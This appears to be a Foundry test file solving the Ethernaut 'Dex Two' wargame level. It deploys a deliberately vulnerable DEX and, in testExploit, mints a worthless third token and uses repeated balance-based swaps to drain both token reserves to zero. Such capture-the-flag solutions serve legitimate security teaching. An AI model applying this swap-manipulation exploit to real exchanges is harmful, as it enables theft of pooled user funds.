// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/EthernautDex2.sol";

contract DexTwoTest is Test {
    DexTwo public dex;
    SwappableTokenTwo public token1;
    SwappableTokenTwo public token2;
    address player = makeAddr("player");

    function setUp() public {
        // Deploy contracts
        dex = new DexTwo();
        token1 = new SwappableTokenTwo(address(dex), "Token1", "TK1", 110);
        token2 = new SwappableTokenTwo(address(dex), "Token2", "TK2", 110);


        // Transfer tokens to DEX and player
        token1.transfer(address(dex), 100); // DEX starts with 100 of token1
        token2.transfer(address(dex), 100); // DEX starts with 100 of token2

        token1.transfer(player, 10); // Player starts with 10 of token1
        token2.transfer(player, 10); // Player starts with 10 of token2

        // Set tokens in DEX
        vm.prank(dex.owner());
        dex.setTokens(address(token1), address(token2));

        // Approve DexTwo to transfer tokens on behalf of player
        vm.startPrank(player);
        token1.approve(address(dex), type(uint256).max);
        token2.approve(address(dex), type(uint256).max);
        vm.stopPrank();
    }

    function testExploit() public {
        // Start exploit
        vm.startPrank(player);
        SwappableTokenTwo token3 = new SwappableTokenTwo(address(dex), "Token3", "TK3", 10000);
        token3.approve(address(dex), type(uint256).max);
        token3.transfer(address(dex), 10);
        
        dex.swap(address(token1), address(token2), dex.balanceOf(address(token1), address(player)));
        dex.swap(address(token2), address(token1), dex.balanceOf(address(token2), address(player)));
        dex.swap(address(token1), address(token2), dex.balanceOf(address(token1), address(player)));
        dex.swap(address(token2), address(token1), dex.balanceOf(address(token2), address(player)));
        dex.swap(address(token1), address(token2), dex.balanceOf(address(token1), address(player)));

        dex.swap(address(token2), address(token1), 45);
        dex.swap(address(token3), address(token2), 10);


        

        // Check balances of the DEX
        uint256 dexToken1Balance = dex.balanceOf(address(token1), address(dex));
        uint256 dexToken2Balance = dex.balanceOf(address(token2), address(dex));

        console.log("DEX Token1 Balance:", dexToken1Balance);
        console.log("DEX Token2 Balance:", dexToken2Balance);

        // Verify DEX reserves are drained
        assertEq(dexToken1Balance, 0, "DEX Token1 should be drained");
        assertEq(dexToken2Balance, 0, "DEX Token2 should be drained");

        vm.stopPrank();
    }
}
